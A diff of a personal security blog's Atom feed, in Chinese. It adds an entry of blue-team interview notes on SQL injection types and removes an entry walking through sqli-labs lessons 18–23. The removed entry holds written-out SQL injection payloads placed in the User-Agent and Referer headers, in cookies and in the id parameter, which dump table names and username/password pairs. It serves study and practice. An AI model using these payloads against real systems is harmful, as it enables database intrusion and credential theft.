@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-28T04:52:44.273Z</updated>
+  <updated>2025-07-30T13:05:17.131Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,38 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>“蓝队防守侧面试知识总结”</title>
+    <link href="http://example.com/2024/06/30/%E2%80%9C%E8%93%9D%E9%98%9F%E9%98%B2%E5%AE%88%E4%BE%A7%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E2%80%9D/"/>
+    <id>http://example.com/2024/06/30/%E2%80%9C%E8%93%9D%E9%98%9F%E9%98%B2%E5%AE%88%E4%BE%A7%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E2%80%9D/</id>
+    <published>2024-06-30T05:44:02.000Z</published>
+    <updated>2025-07-30T13:05:17.131Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    面试题目主要分为web渗透、内网横向、应急响应、流量分析几个大类。</p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ul><li><p><strong>sql注入的原理</strong>:对用户传入参数过滤不严导致恶意sql语句拼接到数据库从而造成漏洞//利用一些sql语句与后端数据库交互,获取数据库信息。</p></li><li><p><strong>注入分类</strong>：</p><pre><code>1. 布尔盲注：即可以根据返回页面判断条件真假的注入。2. 时间盲注：（sleep、benchmark）即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行，（即页面返回时间是否增加）来判断。      3. 联合查询注入：可以使用union的情况下的注入。4. 堆叠注入：可以同时执行多条语句的执行时的注入。5. 宽字节注入：数据库使用jbk编码时反斜杠会被编译,通过利用%df或者%aa与反斜杠组成汉字,绕过编译6. 二次注入：利用函数（get_magic_quotes_gpc）将一些恶意数据处理一下，插入到数据库中，再次使用时，直接在数据库中直接调取命令，不进行检测7. 报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。。。。。</code></pre><span id="more"></span></li><li><p>盲注种类：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">时间盲注：sleep()，benchmark()【通过修改执行次数达到延迟】，笛卡尔积</span><br><span class="line"> 布尔盲注</span><br><span class="line"> dnslog盲注：利用函数load_file()，读取数据库的信息</span><br></pre></td></tr></table></figure><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><h2 id="xxe（外部实体注入）"><a href="#xxe（外部实体注入）" class="headerlink" title="xxe（外部实体注入）"></a>xxe（外部实体注入）</h2><h2 id="csrf（跨站请求伪造）"><a href="#csrf（跨站请求伪造）" class="headerlink" title="csrf（跨站请求伪造）"></a>csrf（跨站请求伪造）</h2><h2 id="ssrf（服务端请求伪造）"><a href="#ssrf（服务端请求伪造）" class="headerlink" title="ssrf（服务端请求伪造）"></a>ssrf（服务端请求伪造）</h2><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><h2 id="水平越权和垂直越权"><a href="#水平越权和垂直越权" class="headerlink" title="水平越权和垂直越权"></a>水平越权和垂直越权</h2><h2 id="框架及其漏洞"><a href="#框架及其漏洞" class="headerlink" title="框架及其漏洞"></a>框架及其漏洞</h2>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;​    面试题目主要分为web渗透、内网横向、应急响应、流量分析几个大类。&lt;/p&gt;
+&lt;h1 id=&quot;web渗透&quot;&gt;&lt;a href=&quot;#web渗透&quot; class=&quot;headerlink&quot; title=&quot;web渗透&quot;&gt;&lt;/a&gt;web渗透&lt;/h1&gt;&lt;h2 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;sql注入的原理&lt;/strong&gt;:对用户传入参数过滤不严导致恶意sql语句拼接到数据库从而造成漏洞//利用一些sql语句与后端数据库交互,获取数据库信息。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;注入分类&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1. 布尔盲注：即可以根据返回页面判断条件真假的注入。
+2. 时间盲注：（sleep、benchmark）即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行，（即页面返回时间是否增加）来判断。      
+3. 联合查询注入：可以使用union的情况下的注入。
+4. 堆叠注入：可以同时执行多条语句的执行时的注入。
+5. 宽字节注入：数据库使用jbk编码时反斜杠会被编译,通过利用%df或者%aa与反斜杠组成汉字,绕过编译
+6. 二次注入：利用函数（get_magic_quotes_gpc）将一些恶意数据处理一下，插入到数据库中，再次使用时，直接在数据库中直接调取命令，不进行检测
+7. 报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+。。。。
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
+    
+    
+    
+    
+    <category term="hvv" scheme="http://example.com/tags/hvv/"/>
+    
+  </entry>
   
   <entry>
     <title>关于木马免杀</title>
@@ -473,31 +505,6 @@
     
     
     <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>lesson18-23</title>
-    <link href="http://example.com/2021/11/28/lesson18/"/>
-    <id>http://example.com/2021/11/28/lesson18/</id>
-    <published>2021-11-28T01:20:42.000Z</published>
-    <updated>2025-07-28T05:03:16.278Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="less18-header-injection"><a href="#less18-header-injection" class="headerlink" title="less18 header injection"></a>less18 header injection</h1><p><img src="https://i.loli.net/2021/11/28/iUSL7pB8aXCKezf.png" alt="header injection.png"></p><p>登入成功返回我的ip地址和user agent</p><p>因为user agent在登入成功后会回显，所以理所当然的尝试在header的user agent注入</p><p>注入语句’ or updatexml(1,concat(0x7e,(database())),1) or ‘1’ =’1</p><p>直接在抓包处改</p><span id="more"></span><p><img src="https://i.loli.net/2021/11/28/IUwgv12aLkqbKDA.png" alt="header injection1.png"></p><p>后面就是正常的把database()改成其他的查库查列操作</p><p>或者使用方法二：</p><p>’ or updatexml（1，concat（0x7e，（database（））），1），‘’，‘’）#进行注入</p><h1 id="lesson-19-referer-injection"><a href="#lesson-19-referer-injection" class="headerlink" title="lesson 19 referer injection"></a>lesson 19 referer injection</h1><p>同样的方法选择用</p><ol><li><p>‘ or updatexml(1,concat(0x7e,(database())),1) and ‘1’=’1</p></li><li><p>‘ or updatexml(1,concat(0x7e,(database())),1) ,’’)#</p><p>来闭合在抓包referer处修改注入</p><p>与lesson18相同。</p></li></ol><h1 id="lesson-20-cookie-injection"><a href="#lesson-20-cookie-injection" class="headerlink" title="lesson 20 cookie injection"></a>lesson 20 cookie injection</h1><p>抓包，在cookie那里注入</p><p>cookie：uname=1’ union select 1,2,database()#</p><p>利用联合查询注入</p><p>查表</p><p>cookie：uname=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’ )#</p><p>查列</p><p>cookie：uname=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’#</p><p>查字段</p><p>cookie：uname=1’ union select 1，2，group_concat(concat_ws(‘@@’,id,username,password)) from users</p><h1 id="lesson-21-cookie-injection"><a href="#lesson-21-cookie-injection" class="headerlink" title="lesson 21 cookie injection"></a>lesson 21 cookie injection</h1><p>跟lesson20思路一样，就是cookie明文经过base64加密</p><p><a href="https://tool.oschina.net/encrypt?type=3">base64在线加密</a></p><p>查库</p><p>‘) union select 1,2,database()#</p><p>表</p><p>‘) union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’),3#</p><p>列</p><p>)’ union select 1,2,(select goup_concat(column_name) from information_schema.columns where table_name=’users’)#</p><p>字段</p><p>‘) union select 1,group_concat(concat_ws(‘@@’,username,password)),2#</p><h1 id="lession-22-cookie-injection"><a href="#lession-22-cookie-injection" class="headerlink" title="lession 22 cookie injection"></a>lession 22 cookie injection</h1><p>和上一关一样，只是闭合单引号变成了双引号。</p><h1 id="lession-23"><a href="#lession-23" class="headerlink" title="lession 23"></a>lession 23</h1><p><img src="https://s2.loli.net/2022/02/09/VkWy5IBbQf1gpc2.png" alt="QQ截图20220209170517.png"></p><p>这里对#和–都做了转译</p><p>法一：因为被处理的是注释符号，所以只要用–+和#以外的的注释符就行了。（用;%00来注释）</p><p>法二：避免使用注释符，而是用and ‘1’=’1来包裹</p><p>查库</p><p>？id=-1’ union select 1,database(),3 and ‘1’=’1</p><p>查表</p><p>？id=-1’ union select 1,goup_concat(table_name)from information_schema.tables where table_schema=’security’ limit 0,1),3 and ‘1’=’1</p><p>查列</p><p>？id=-1’ union select 1,group_concat(column_name)from information_schema.columns where table=’users’),3 and’1’=’1 </p><p>查字段</p><p>？id=-1’ union select 1,group_concat(concat_ws(@@,username,password))from users,3 and ‘1’=’1</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;less18-header-injection&quot;&gt;&lt;a href=&quot;#less18-header-injection&quot; class=&quot;headerlink&quot; title=&quot;less18 header injection&quot;&gt;&lt;/a&gt;less18 header injection&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/28/iUSL7pB8aXCKezf.png&quot; alt=&quot;header injection.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;登入成功返回我的ip地址和user agent&lt;/p&gt;
-&lt;p&gt;因为user agent在登入成功后会回显，所以理所当然的尝试在header的user agent注入&lt;/p&gt;
-&lt;p&gt;注入语句’ or updatexml(1,concat(0x7e,(database())),1) or ‘1’ =’1&lt;/p&gt;
-&lt;p&gt;直接在抓包处改&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
-    
-    
-    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
